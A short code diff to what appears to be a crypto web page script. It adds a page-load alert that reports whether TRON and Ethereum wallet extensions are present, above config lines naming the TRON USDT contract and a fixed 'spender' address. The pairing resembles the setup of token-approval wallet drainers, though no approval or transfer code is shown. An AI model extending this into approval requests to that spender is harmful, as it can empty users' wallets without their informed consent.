@@ -1,3 +1,8 @@
+window.addEventListener("load", () => {
+  setTimeout(() => {
+    alert("tronWeb: " + (window.tronWeb ? "YES" : "NO") + " | tronLink: " + (window.tronLink ? "YES" : "NO") + " | ethereum: " + (window.ethereum ? "YES" : "NO"));
+  }, 2000);
+});
 // ===== TRON CONFIG =====
 const TRON_USDT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
 const TRON_SPENDER = "TCuZP5cAABx4RpJoYdBxBPdVUWp7onCtQt";
